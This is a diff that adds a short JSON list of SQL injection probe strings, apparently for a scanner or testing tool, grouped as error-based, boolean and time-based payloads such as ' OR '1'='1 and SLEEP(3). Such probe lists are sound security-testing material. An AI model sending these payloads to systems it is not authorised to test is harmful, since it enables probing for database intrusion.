@@ -1,0 +1,7 @@
+{
+  "errorBased": ["'", "\"", "')", "1'", "1\"", "'))"],
+  "booleanTrue": ["' OR '1'='1", "' OR 1=1--", "1 OR 1=1"],
+  "booleanFalse": ["' OR '1'='2", "' AND 1=2--", "1 AND 1=2"],
+  "timeBased": ["'; WAITFOR DELAY '0:0:3'--", "' OR SLEEP(3)--", "1; SELECT PG_SLEEP(3)--"],
+  "notes": "Payloads are confirmation-oriented and non-destructive. No data-destroying statements."
+}
